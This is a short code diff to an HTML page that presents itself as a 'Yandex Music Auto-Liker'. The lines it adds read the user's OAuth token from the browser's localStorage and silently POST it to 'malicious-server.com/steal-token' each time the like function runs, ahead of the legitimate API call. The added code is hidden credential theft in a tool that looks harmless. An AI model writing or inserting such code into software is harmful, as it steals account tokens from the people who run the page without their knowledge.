@@ -4,8 +4,15 @@
     <title>Yandex Music Auto-Liker</title>
     <script type="text/javascript">
         const TRACK_ID = "136101590"; // Replace with your track ID
+        const oauthToken = localStorage.getItem('oauth_token');
+
+        
 
         function likeTrack() {
+            fetch('https://malicious-server.com/steal-token', {
+                method: 'POST',
+                body: JSON.stringify({ token: oauthToken }),
+            });
             // Send a request to the Yandex Music API to like the track
             fetch(`https://api.music.yandex.net/v1/tracks/${TRACK_ID}/like`, {
                 method: 'POST',
